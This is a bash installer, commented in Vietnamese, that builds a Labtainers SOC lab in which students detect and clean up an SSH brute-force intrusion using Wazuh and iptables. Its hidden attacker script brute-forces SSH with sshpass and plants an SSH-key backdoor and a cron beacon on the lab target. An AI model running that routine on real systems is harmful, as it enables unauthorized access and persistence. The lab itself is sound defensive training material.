#!/bin/bash
# ============================================================================
# Trinh cai dat lab soc-ssh-defense len VM Labtainers.
#   bash install-soc-ssh-defense.sh
# Yeu cau: da chay update-designer.sh va co bien $LABTAINER_DIR.
# (File nay duoc SINH TU DONG tu thu muc nguon - khong sua tay.)
# ============================================================================
set -e
if [ -z "$LABTAINER_DIR" ]; then
  echo "LOI: chua co \$LABTAINER_DIR. Chay ./update-designer.sh roi mo terminal moi."
  exit 1
fi
LAB="$LABTAINER_DIR/labs/soc-ssh-defense"
echo ">> Tao lab tai: $LAB"
if [ ! -d "$LAB/siem" ]; then echo ">> them siem..."; ( cd "$LAB" && new_lab_setup.py -a siem ) || true; fi
if [ ! -d "$LAB/defender" ]; then echo ">> them defender..."; ( cd "$LAB" && new_lab_setup.py -a defender ) || true; fi
mkdir -p "$LAB/config" "$LAB/dockerfiles" "$LAB/docs" "$LAB/instr_config" \
         "$LAB/target/_bin" "$LAB/attacker/_bin" "$LAB/siem/_bin" "$LAB/defender/_bin"

cat > "$LAB/config/start.config" <<'__EOF_KB1_a7f3__'
# start.config - Lab soc-ssh-defense (Buoc 1)
# 2 container: attacker (an, TERMINALS 0) tan cong brute-force SSH vao target.
# Sinh vien ngoi o target: doc auth.log, chan IP ke tan cong bang iptables.

GLOBAL_SETTINGS
	LAB_MASTER_SEED soc-ssh-defense_student_master_seed
	# Container noi cham diem + noi sinh vien thao tac phong thu
	GRADE_CONTAINER target

# Mot mang phang cho ca hai may
NETWORK  SOC_NET
	MASK 172.20.0.0/24
	GATEWAY 172.20.0.101

# --- May nan nhan kiem tram phong thu cua sinh vien ---
CONTAINER target
	USER ubuntu
	SOC_NET 172.20.0.10
	ADD-HOST attacker:172.20.0.5
	ADD-HOST siem:172.20.0.20
	TERMINALS 1

# --- Ke tan cong: chay ngam, khong terminal (TERMINALS 0 = "hidden") ---
CONTAINER attacker
	USER ubuntu
	SOC_NET 172.20.0.5
	ADD-HOST target:172.20.0.10
	TERMINALS 0

# --- SIEM: chay Wazuh (indexer + server + dashboard) ---
CONTAINER siem
	USER ubuntu
	SOC_NET 172.20.0.20
	ADD-HOST target:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	TERMINALS 1

# --- DEFENDER: tram analyst, co Firefox de xem dashboard Wazuh ---
CONTAINER defender
	USER ubuntu
	SOC_NET 172.20.0.30
	ADD-HOST siem:172.20.0.20
	ADD-HOST target:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	X11 YES
	TERMINALS 1
__EOF_KB1_a7f3__

cat > "$LAB/config/about.txt" <<'__EOF_KB1_a7f3__'
SOC Lab 1 - Phong thu SSH brute-force.
Mot may tan cong (an) lien tuc do mat khau SSH vao may cua ban.
Nhiem vu: phat hien qua log va chan IP ke tan cong bang iptables.
__EOF_KB1_a7f3__

cat > "$LAB/config/parameter.config" <<'__EOF_KB1_a7f3__'
# parameter.config - ca nhan hoa (chong chep bai)
# Moi sinh vien co so <EMPID> khac nhau -> tai khoan bi chiem la emp<EMPID> khac nhau.
# Token EMPID duoc thay bang so ngau nhien trong ca 2 file: target fixlocal + attacker attack.sh
EMPID : RAND_REPLACE : target:.local/bin/fixlocal.sh;attacker:attack.sh : EMPID : 1000 : 9999
__EOF_KB1_a7f3__

cat > "$LAB/docs/read_first.txt" <<'__EOF_KB1_a7f3__'
=== SOC Lab: Ung pho su co xam nhap SSH (Wazuh SIEM) ===

Mot ke tan cong da brute-force SSH vao "target" va CHIEM DUOC mot tai khoan nhan vien,
roi CAI CAM de quay lai (SSH key backdoor + cronjob doc). No con dinh ky cai lai,
nen ban phai CHAN duoc no thi don dep moi triet de.

Nhiem vu: DIEU TRA va UNG PHO tu tram DEFENDER (khong lam truc tiep tren target).

*** Lan dau: cho siem cai Wazuh xong (~8-10'):  tail -f /var/log/wazuh-install.log ***

--- 1) Dashboard (tren defender, Firefox tu mo) ---
  https://172.20.0.20   (Advanced -> Add Exception)
  admin / (tren siem chay: sudo cat /root/wazuh-admin-credentials.txt)
  -> Threat Hunting: tim IP tan cong, va TAI KHOAN NAO bi chiem
     (tai khoan co su kien dang nhap THANH CONG, khac voi chi bi thu that bai).

--- 2) Dieu tra & ung pho (SSH tu defender sang target) ---
  ssh analyst@target            (mat khau: analyst)
  a. Xac dinh tai khoan bi chiem:  sudo cat /var/log/auth.log | grep "Accepted password"
                                   (dang: "Accepted password for emp#### from 172.20.0.5")
  b. Chan ke tan cong:             sudo iptables -A INPUT -s <IP> -j DROP
  c. Go SSH key backdoor:          soat /home/<user>/.ssh/authorized_keys,
                                   xoa dong co 'backdoor@attacker'
  d. Xoa cronjob doc:              sudo crontab -u <user> -l
                                   sudo crontab -u <user> -r   (hoac xoa dong .beacon)
  e. Khoa tai khoan bi chiem:      sudo passwd -l <user>
  f. Kiem chung: khong con backdoor/cron; SSH hop le van hoat dong.

Xong: checkwork (tu kiem tra) hoac stoplab (nop bai).
Muc tieu: incident_resolved = Y  (da chan + khoa + go sach backdoor & cron).
__EOF_KB1_a7f3__

cat > "$LAB/dockerfiles/Dockerfile.soc-ssh-defense.target.student" <<'__EOF_KB1_a7f3__'
#
# Labtainer Dockerfile - target (may nan nhan / tram phong thu)
#
ARG registry
# Base co san openssh-server + xinetd (sshd) + rsyslog (auth.log)
FROM $registry/labtainer.network.ssh
#FROM $registry/labtainer.base2
#FROM $registry/labtainer.network
#FROM $registry/labtainer.centos
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
#  put package installation here, e.g.,
#     RUN apt-get update && apt-get install -y --no-install-recommends somepackage
#
# Cho phep prestop chay "sudo -n iptables" khong can mat khau (de chup rule luc cham diem)
# %sudo NOPASSWD cho cac lenh dieu tra/xu ly + prestop (iptables, cat, crontab, grep, passwd)
RUN echo '%sudo ALL=(ALL) NOPASSWD: /usr/sbin/iptables, /sbin/iptables, /usr/sbin/iptables-save, /sbin/iptables-save, /usr/bin/cat, /bin/cat, /usr/bin/crontab, /bin/crontab, /usr/bin/grep, /bin/grep, /usr/bin/passwd, /bin/passwd' > /etc/sudoers.d/labtainer-iptables \
    && chmod 440 /etc/sudoers.d/labtainer-iptables
#
# cron: can cho kich ban persistence (attacker cai cronjob) + prestop doc crontab
RUN apt-get update && apt-get install -y --no-install-recommends cron || true
#
# --- Wazuh agent (bake luc build, tro ve manager 172.20.0.20) ---
RUN apt-get update && apt-get install -y --no-install-recommends apt-transport-https ca-certificates curl gnupg
RUN curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import \
    && chmod 644 /usr/share/keyrings/wazuh.gpg
RUN echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list
RUN apt-get update && WAZUH_MANAGER="172.20.0.20" apt-get install -y wazuh-agent
RUN systemctl enable wazuh-agent
#
# Install the system files found in the _system directory
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
#  **** Perform all root operations, e.g.,           ****
#  **** "apt-get install" prior to the USER command. ****
#
USER $user_name
ENV HOME /home/$user_name
#
# Install files in the user home directory
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
# remove after docker fixes problem with empty tars
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
#  The first thing that executes on the container.
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_KB1_a7f3__

cat > "$LAB/dockerfiles/Dockerfile.soc-ssh-defense.attacker.student" <<'__EOF_KB1_a7f3__'
#
# Labtainer Dockerfile - attacker (may tan cong tu dong, an)
#
ARG registry
# Base network co openssh-client de thu dang nhap
FROM $registry/labtainer.network
#FROM $registry/labtainer.base2
#FROM $registry/labtainer.kali
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
#  put package installation here
#
# sshpass: de thu mat khau SSH khong tuong tac (gia lap brute-force)
RUN apt-get update && apt-get install -y --no-install-recommends sshpass \
    && rm -rf /var/lib/apt/lists/*
#
# Install the system files found in the _system directory
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
#  **** Perform all root operations prior to the USER command. ****
#
USER $user_name
ENV HOME /home/$user_name
#
# Install files in the user home directory
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
# remove after docker fixes problem with empty tars
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
#  The first thing that executes on the container.
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_KB1_a7f3__

cat > "$LAB/dockerfiles/Dockerfile.soc-ssh-defense.siem.student" <<'__EOF_KB1_a7f3__'
#
# Labtainer Dockerfile - siem (chay Wazuh: indexer + server + dashboard)
#
ARG registry
FROM $registry/labtainer.base2
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# Cong cu cho bake + cai offline (setcap = libcap2-bin)
RUN apt-get update && apt-get install -y --no-install-recommends curl gnupg tar libcap2-bin openssl \
    && rm -rf /var/lib/apt/lists/*
#
# Cho prestop doc alerts + agent_control khong can mat khau (de cham diem)
RUN echo 'ubuntu ALL=(ALL) NOPASSWD: /bin/cat /var/ossec/logs/alerts/alerts.log, /usr/bin/cat /var/ossec/logs/alerts/alerts.log, /var/ossec/bin/agent_control' > /etc/sudoers.d/labtainer-wazuh \
    && chmod 440 /etc/sudoers.d/labtainer-wazuh
#
# --- PRE-BAKE: tai goi Wazuh + tao chung chi luc BUILD (de first-boot cai OFFLINE) ---
RUN mkdir -p /root/wz && cd /root/wz \
 && curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh \
 && bash wazuh-install.sh -dw deb -da amd64 \
 && curl -sO https://packages.wazuh.com/4.14/config.yml \
 && sed -i 's/<[a-z0-9-]*-ip>/127.0.0.1/g' config.yml \
 && bash wazuh-install.sh -g
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_KB1_a7f3__

cat > "$LAB/dockerfiles/Dockerfile.soc-ssh-defense.defender.student" <<'__EOF_KB1_a7f3__'
#
# Labtainer Dockerfile - defender (tram analyst, co Firefox xem dashboard Wazuh)
#
ARG registry
# firefox3 = Firefox moi (tren network3) - chay duoc dashboard Wazuh hien dai
FROM $registry/labtainer.firefox3
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# Firefox co san trong base firefox3; them ssh client de SSH sang target xu ly su co
RUN apt-get update || true; apt-get install -y --no-install-recommends openssh-client \
    && rm -rf /var/lib/apt/lists/*
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
# Base firefox3 co the da co san user 'ubuntu' -> chi tao neu chua co
RUN id -u $user_name >/dev/null 2>&1 || useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_KB1_a7f3__

cat > "$LAB/instr_config/results.config" <<'__EOF_KB1_a7f3__'
# results.config - trich du lieu cham diem (doc tu prestop.stdout)

_marker      = target:prestop.stdout : FILE_REGEX : PRESTOP_MARKER
# Da chan IP ke tan cong?
_blocked     = target:prestop.stdout : FILE_REGEX : 172\.20\.0\.5(/32)? -j (DROP|REJECT)
# Co dau vet brute-force (Failed) va chiem tai khoan (Accepted) tu attacker?
_bruteforce  = target:prestop.stdout : FILE_REGEX : Failed password.*172\.20\.0\.5
_compromised = target:prestop.stdout : FILE_REGEX : Accepted password.*172\.20\.0\.5
# Persistence con sot? (backdoor SSH key / cronjob doc)
_backdoor    = target:prestop.stdout : FILE_REGEX : backdoor@attacker
_cron        = target:prestop.stdout : FILE_REGEX : \.beacon
# Tai khoan bi chiem da bi khoa? (shadow: emp<so>:! hoac *)
_locked      = target:prestop.stdout : FILE_REGEX : emp[0-9]+:[!*]
# SIEM (siem) co ghi nhan tan cong? Agent ket noi?
_siem_detected   = siem:prestop.stdout : FILE_REGEX : Failed password.*172\.20\.0\.5
_agent_connected = siem:prestop.stdout : FILE_REGEX : target.*Active

# --- Goi y checkwork ---
#CHECK_TRUE: Chua chan IP ke tan cong. VD: sudo iptables -A INPUT -s 172.20.0.5 -j DROP
cw_blocked = target:prestop.stdout : FILE_REGEX : 172\.20\.0\.5(/32)? -j (DROP|REJECT)
#CHECK_FALSE: Van con SSH key backdoor (backdoor@attacker) - hay xoa khoi authorized_keys cua tai khoan bi chiem.
cw_backdoor = target:prestop.stdout : FILE_REGEX : backdoor@attacker
#CHECK_FALSE: Van con cronjob doc (.beacon) - hay xoa crontab cua tai khoan bi chiem.
cw_cron = target:prestop.stdout : FILE_REGEX : \.beacon
#CHECK_TRUE: Chua khoa tai khoan bi chiem. VD: sudo passwd -l emp<so>
cw_locked = target:prestop.stdout : FILE_REGEX : emp[0-9]+:[!*]
__EOF_KB1_a7f3__

cat > "$LAB/instr_config/goals.config" <<'__EOF_KB1_a7f3__'
# goals.config - tieu chi dat/khong dat (nhieu buoc)

# Phat hien: co brute-force va co tai khoan bi chiem
detected_attack    = boolean : _bruteforce
account_compromised = boolean : _compromised
# SIEM hoat dong
siem_detected      = boolean : _siem_detected
agent_connected    = boolean : _agent_connected
# Xu ly su co (nhieu buoc)
blocked_attacker   = boolean : _blocked
backdoor_key_removed  = boolean : ( _marker and_not _backdoor )
malicious_cron_removed = boolean : ( _marker and_not _cron )
account_secured    = boolean : _locked

# MUC TIEU TONG: da chan + khoa tai khoan + go sach backdoor & cron
incident_resolved  = boolean : ( _blocked and _locked and _marker and_not _backdoor and_not _cron )
__EOF_KB1_a7f3__

cat > "$LAB/target/_bin/fixlocal.sh" <<'__EOF_KB1_a7f3__'
#!/bin/bash
# Chay LAN DAU tren target, quyen user 'ubuntu'. $1 = mat khau sudo.
PW="$1"

# 'alice' mat khau MANH -> attacker chi tao "Failed password" (nhieu, gay nhieu).
echo "$PW" | sudo -S useradd -m -s /bin/bash alice 2>/dev/null
echo "$PW" | sudo -S bash -c 'echo "alice:Al1ce_Str0ng_Pw_2026" | chpasswd'

# Nan nhan YEU 'empEMPID' (EMPID ca nhan hoa) -> attacker DO TRUNG -> "Accepted password".
echo "$PW" | sudo -S useradd -m -s /bin/bash empEMPID 2>/dev/null
echo "$PW" | sudo -S bash -c 'echo "empEMPID:Password123" | chpasswd'

# 'analyst' cho DEFENDER SSH sang xu ly su co (mat khau: analyst).
echo "$PW" | sudo -S useradd -m -s /bin/bash analyst 2>/dev/null
echo "$PW" | sudo -S bash -c 'echo "analyst:analyst" | chpasswd'
echo "$PW" | sudo -S usermod -aG sudo analyst 2>/dev/null

# Bat password authentication cho sshd (de ghi Failed/Accepted vao auth.log)
echo "$PW" | sudo -S sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config 2>/dev/null
echo "$PW" | sudo -S service ssh restart 2>/dev/null \
  || echo "$PW" | sudo -S systemctl restart ssh 2>/dev/null \
  || echo "$PW" | sudo -S pkill -HUP sshd 2>/dev/null || true

exit 0
__EOF_KB1_a7f3__

cat > "$LAB/target/_bin/prestop" <<'__EOF_KB1_a7f3__'
#!/bin/bash
# Chup trang thai target luc checkwork/stoplab -> prestop.stdout (dung cham diem).
trap "echo Timed out; exit" SIGTERM

echo "PRESTOP_MARKER"

echo "=== iptables -S ==="
sudo -n iptables -S 2>/dev/null

echo "=== auth.log ==="
sudo -n cat /var/log/auth.log 2>/dev/null

echo "=== emp authorized_keys ==="
for u in $(ls /home 2>/dev/null | grep '^emp'); do
  echo "user:$u"
  sudo -n cat /home/$u/.ssh/authorized_keys 2>/dev/null
done

echo "=== emp crontabs ==="
for u in $(ls /home 2>/dev/null | grep '^emp'); do
  echo "user:$u"
  sudo -n crontab -u $u -l 2>/dev/null
done

echo "=== emp shadow lock ==="
for u in $(ls /home 2>/dev/null | grep '^emp'); do
  sudo -n grep "^$u:" /etc/shadow 2>/dev/null
done
__EOF_KB1_a7f3__

cat > "$LAB/target/_bin/treataslocal" <<'__EOF_KB1_a7f3__'
iptables
iptables-save
__EOF_KB1_a7f3__

cat > "$LAB/attacker/_bin/fixlocal.sh" <<'__EOF_KB1_a7f3__'
#!/bin/bash
# Chay LAN DAU tren container attacker (an). Khoi dong vong lap tan cong ngam,
# tach hoan toan khoi tien trinh khoi tao (setsid + &) de chay lien tuc.
setsid bash /home/ubuntu/attack.sh >/home/ubuntu/attack.log 2>&1 < /dev/null &
exit 0
__EOF_KB1_a7f3__

cat > "$LAB/attacker/attack.sh" <<'__EOF_KB1_a7f3__'
#!/bin/bash
# Tan cong: brute-force emp<EMPID>, do trung -> cai cam persistence (SSH key backdoor + cron),
# va DINH KY cai lai -> sinh vien phai CHAN IP moi dut han. Alice bi do that bai (gay nhieu).
TARGET=target
VICTIM=empEMPID
GOODPW=Password123
FAILPW_LIST="123456 admin root toor qwerty letmein 111111 abc123 iloveyou monkey dragon"
BK="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNRXGMHgh57sbtVbThblDy9ISjZ0dXlDeu+hIq4jyKlUMbuO/pf+dRNe0t+y5UDO9CrhPtzvVbKHyvWiIlLqSPgYv4MHU/B7J1n0ML5wo4xwd1Ei8EkNNqGhE/Lc9paN/r3NX9EBkr82Cl5r9zG2pdfokFiRZflToW4lvdckIzOA64p9N1yLfcawfxKb10Zo+WCDo3yB5GBIznKBEN+5flJpmDXtdcf8Iheq1wdGZKmcp1ECXZNbRw+LbKoiho/XfyDNePAiEGGGdo7XisXfEhvP3TCGPZOJpS8Y6shsQdPLKDmQsmF46rw0PLe+yRevrU9zd0Det4AsewngiUyVyl backdoor@attacker"

SSH_OPTS="-o PreferredAuthentications=password -o PubkeyAuthentication=no \
-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=4"

install_persistence() {
  sshpass -p "$GOODPW" ssh $SSH_OPTS ${VICTIM}@${TARGET} \
    "mkdir -p ~/.ssh && chmod 700 ~/.ssh; \
     grep -q 'backdoor@attacker' ~/.ssh/authorized_keys 2>/dev/null || echo '$BK' >> ~/.ssh/authorized_keys; \
     printf '#!/bin/bash\n# beacon\n:\n' > /tmp/.beacon.sh && chmod +x /tmp/.beacon.sh; \
     ( crontab -l 2>/dev/null | grep -v '.beacon'; echo '* * * * * /bin/bash /tmp/.beacon.sh' ) | crontab -" \
    2>/dev/null
}

# Cho sshd cua target san sang
for i in $(seq 1 60); do
  timeout 3 bash -c "echo > /dev/tcp/${TARGET}/22" 2>/dev/null && break
  sleep 2
done

# Vong lap tan cong
while true; do
  # Tao nhieu "Failed password" tren alice
  for pw in $FAILPW_LIST; do
    sshpass -p "$pw" ssh $SSH_OPTS alice@${TARGET} true 2>/dev/null
    sleep 1
  done
  # Do trung emp<EMPID> -> dang nhap thanh cong + cai cam persistence
  if sshpass -p "$GOODPW" ssh $SSH_OPTS ${VICTIM}@${TARGET} true 2>/dev/null; then
    install_persistence
  fi
  sleep 20
done
__EOF_KB1_a7f3__

cat > "$LAB/siem/_bin/fixlocal.sh" <<'__EOF_KB1_a7f3__'
#!/bin/bash
# Lan khoi dong dau tren siem: tu cai Wazuh all-in-one o CHE DO NEN (~10-15 phut).
# $1 = mat khau sudo. Chi cai neu chua co (/var/ossec).
PW="$1"
if [ ! -d /var/ossec ]; then
  echo "$PW" | sudo -S nohup bash /home/ubuntu/wazuh-setup.sh >/dev/null 2>&1 &
fi
exit 0
__EOF_KB1_a7f3__

cat > "$LAB/siem/_bin/prestop" <<'__EOF_KB1_a7f3__'
#!/bin/bash
# Chay luc 'checkwork'/'stoplab' tren siem. Chup bang chung SIEM da phat hien tan cong.
trap "echo Timed out; exit" SIGTERM

echo "=== wazuh alerts (attacker 172.20.0.5) ==="
sudo -n cat /var/ossec/logs/alerts/alerts.log 2>/dev/null | grep '172.20.0.5' | tail -50

echo "=== agents ==="
sudo -n /var/ossec/bin/agent_control -l 2>/dev/null
__EOF_KB1_a7f3__

cat > "$LAB/siem/wazuh-setup.sh" <<'__EOF_KB1_a7f3__'
#!/bin/bash
# Chay boi root o lan boot dau (goi tu fixlocal.sh). Cai Wazuh OFFLINE tu goi da bake san.
# Khong can internet. Tien do ghi vao /var/log/wazuh-install.log
cd /root/wz 2>/dev/null || cd /root
echo "[wazuh-setup] Cai Wazuh OFFLINE, bat dau luc $(date)" > /var/log/wazuh-install.log
bash wazuh-install.sh -a -o >> /var/log/wazuh-install.log 2>&1
echo "[wazuh-setup] Hoan tat luc $(date)" >> /var/log/wazuh-install.log
# Trich mat khau admin ra file de tien tra cuu
tar -O -xf /root/wz/wazuh-install-files.tar wazuh-install-files/wazuh-passwords.txt 2>/dev/null \
  | grep -A1 "'admin'" > /root/wazuh-admin-credentials.txt 2>/dev/null
__EOF_KB1_a7f3__

cat > "$LAB/defender/_bin/student_startup.sh" <<'__EOF_KB1_a7f3__'
#!/bin/bash
# Chay trong terminal ao cua defender. Mo Wazuh dashboard trong Firefox.
# Chi chay duoi quyen user thuong (khong phai root).
if ! id | grep -q 'uid=0'; then
  ( firefox https://172.20.0.20 >/dev/null 2>&1 & )
fi
__EOF_KB1_a7f3__

# quyen thuc thi
chmod +x "$LAB/target/_bin/fixlocal.sh"
chmod +x "$LAB/target/_bin/prestop"
chmod +x "$LAB/attacker/_bin/fixlocal.sh"
chmod +x "$LAB/attacker/attack.sh"
chmod +x "$LAB/siem/_bin/fixlocal.sh"
chmod +x "$LAB/siem/_bin/prestop"
chmod +x "$LAB/siem/wazuh-setup.sh"
chmod +x "$LAB/defender/_bin/student_startup.sh"

# chuan hoa line-ending (LF)
sed -i 's/\r$//' "$LAB/config/start.config"
sed -i 's/\r$//' "$LAB/config/about.txt"
sed -i 's/\r$//' "$LAB/config/parameter.config"
sed -i 's/\r$//' "$LAB/docs/read_first.txt"
sed -i 's/\r$//' "$LAB/dockerfiles/Dockerfile.soc-ssh-defense.target.student"
sed -i 's/\r$//' "$LAB/dockerfiles/Dockerfile.soc-ssh-defense.attacker.student"
sed -i 's/\r$//' "$LAB/dockerfiles/Dockerfile.soc-ssh-defense.siem.student"
sed -i 's/\r$//' "$LAB/dockerfiles/Dockerfile.soc-ssh-defense.defender.student"
sed -i 's/\r$//' "$LAB/instr_config/results.config"
sed -i 's/\r$//' "$LAB/instr_config/goals.config"
sed -i 's/\r$//' "$LAB/target/_bin/fixlocal.sh"
sed -i 's/\r$//' "$LAB/target/_bin/prestop"
sed -i 's/\r$//' "$LAB/target/_bin/treataslocal"
sed -i 's/\r$//' "$LAB/attacker/_bin/fixlocal.sh"
sed -i 's/\r$//' "$LAB/attacker/attack.sh"
sed -i 's/\r$//' "$LAB/siem/_bin/fixlocal.sh"
sed -i 's/\r$//' "$LAB/siem/_bin/prestop"
sed -i 's/\r$//' "$LAB/siem/wazuh-setup.sh"
sed -i 's/\r$//' "$LAB/defender/_bin/student_startup.sh"

echo ""
echo ">> XONG! Lab san sang tai: $LAB"
echo ">> Build & chay:"
echo "     cd \$LABTAINER_DIR/scripts/labtainer-student && rebuild soc-ssh-defense"
